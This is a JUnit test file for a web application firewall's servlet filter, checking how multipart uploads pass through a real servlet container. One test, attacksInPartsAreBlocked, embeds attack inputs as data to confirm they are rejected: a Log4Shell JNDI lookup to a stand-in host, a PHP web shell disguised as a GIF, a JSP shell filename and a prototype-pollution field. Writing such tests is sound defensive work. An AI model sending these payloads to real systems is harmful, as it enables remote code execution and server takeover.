package com.aiwaf.servlet;

import com.aiwaf.core.AiwafConfig;
import com.aiwaf.core.AiwafEngine;
import jakarta.servlet.Filter;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.Part;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Comparator;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Multipart uploads through the filter in a real servlet container: parts are checked, uploads
 * reach the app whole, and a servlet with no multipart config still reads the raw upload. Each
 * container's test starts it with the same two servlets and the filter in front.
 */
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
abstract class MultipartContainerChecks {
    private static final HttpClient CLIENT = HttpClient.newHttpClient();
    private static final String BOUNDARY = "aiwafContainerBoundary";
    private Path base;
    private int port;

    /** Reads the parts the container parsed: their count and total size. Mapped at /upload, with a multipart config. */
    public static final class Upload extends HttpServlet {
        @Override
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
            long bytes = 0;
            int count = 0;
            try {
                for (Part part : request.getParts()) {
                    count++;
                    bytes += part.getInputStream().readAllBytes().length;
                }
            } catch (jakarta.servlet.ServletException ex) {
                throw new IOException(ex);
            }
            response.getWriter().write(count + " " + bytes);
        }
    }

    /** Reads the raw upload itself. Mapped at /raw, with no multipart config. */
    public static final class Raw extends HttpServlet {
        @Override
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
            response.getWriter().write(String.valueOf(request.getInputStream().readAllBytes().length));
        }
    }

    /** Starts the container with Upload at /upload, Raw at /raw and the filter on /*, and returns its port. */
    abstract int start(Path base, Filter filter) throws Exception;

    abstract void stop() throws Exception;

    @BeforeAll
    void startContainer() throws Exception {
        base = Files.createTempDirectory("aiwaf-container-");
        AiwafConfig config = new AiwafConfig();
        config.privateIpsExempted = false;
        config.headerValidationEnabled = false;
        config.maxRequestBodyBytes = 16 * 1024 * 1024;
        config.pathManifestEnabled = false;
        port = start(base, new AiwafServletFilter(new AiwafEngine(config)));
    }

    @AfterAll
    void stopContainer() throws Exception {
        stop();
        try (var paths = Files.walk(base)) {
            paths.sorted(Comparator.reverseOrder()).forEach(path -> path.toFile().delete());
        }
    }

    private static byte[] part(String disposition, byte[] content) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.writeBytes(("--" + BOUNDARY + "\r\nContent-Disposition: form-data; " + disposition + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        out.writeBytes(content);
        out.writeBytes("\r\n".getBytes(StandardCharsets.UTF_8));
        return out.toByteArray();
    }

    private HttpResponse<String> post(String path, byte[]... parts) throws Exception {
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        for (byte[] item : parts) body.writeBytes(item);
        body.writeBytes(("--" + BOUNDARY + "--\r\n").getBytes(StandardCharsets.UTF_8));
        HttpRequest request = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + port + path))
                .header("Content-Type", "multipart/form-data; boundary=" + BOUNDARY)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                .header("Accept", "text/html")
                .POST(HttpRequest.BodyPublishers.ofByteArray(body.toByteArray()))
                .build();
        return CLIENT.send(request, HttpResponse.BodyHandlers.ofString());
    }

    @Test
    void ordinaryUploadsReachTheAppWhole() throws Exception {
        byte[] file = new byte[2 * 1024 * 1024];
        Arrays.fill(file, (byte) 7);
        HttpResponse<String> response = post("/upload", part("name=\"title\"", "Holiday".getBytes()),
                part("name=\"file\"; filename=\"beach.jpg\"", file));
        assertEquals(200, response.statusCode(), response.body());
        assertEquals("2 " + (file.length + 7), response.body());
    }

    @Test
    void attacksInPartsAreBlocked() throws Exception {
        assertEquals(403, post("/upload", part("name=\"file\"; filename=\"shell.jsp\"", "x".getBytes())).statusCode());
        assertEquals(403, post("/upload", part("name=\"q\"", "${jndi:ldap://evil.example/a}".getBytes())).statusCode());
        assertEquals(403, post("/upload", part("name=\"avatar\"; filename=\"a.jpg\"", "GIF89a<?php system($_GET['c']); ?>".getBytes())).statusCode());
        assertEquals(403, post("/upload", part("name=\"__proto__[admin]\"", "1".getBytes())).statusCode());
    }

    /** Calling getParts before the parameters once failed this request in Tomcat, which kept the failure. */
    @Test
    void aServletWithoutMultipartConfigStillReadsTheRawUpload() throws Exception {
        byte[] file = new byte[512 * 1024];
        Arrays.fill(file, (byte) 9);
        byte[] upload = part("name=\"file\"; filename=\"data.bin\"", file);
        HttpResponse<String> response = post("/raw", upload);
        assertEquals(200, response.statusCode(), response.body());
        int expected = upload.length + ("--" + BOUNDARY + "--\r\n").length();
        assertEquals(String.valueOf(expected), response.body());
        assertTrue(expected > file.length);
    }
}
